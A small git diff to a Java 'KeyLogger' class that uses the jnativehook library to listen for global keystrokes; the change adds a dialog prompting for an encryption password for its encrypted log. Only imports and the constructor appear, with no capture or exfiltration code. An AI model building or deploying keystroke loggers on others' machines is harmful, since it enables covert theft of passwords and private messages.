@@ -3,6 +3,8 @@ package com.github.giorgosg1an;
 import java.util.ArrayList;
 import java.util.List;
 
+import javax.swing.JOptionPane;
+
 import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
@@ -18,7 +20,8 @@ public class KeyLogger implements NativeKeyListener{
     public KeyLogger() {
         EncryptedLogger tmp = null;
         try {
-            tmp = new EncryptedLogger();
+            String password = JOptionPane.showInputDialog(null, "Enter encryption password: ");
+            tmp = new EncryptedLogger(password.toCharArray());
         } catch (Exception e) {
             e.printStackTrace();
             System.exit(1);
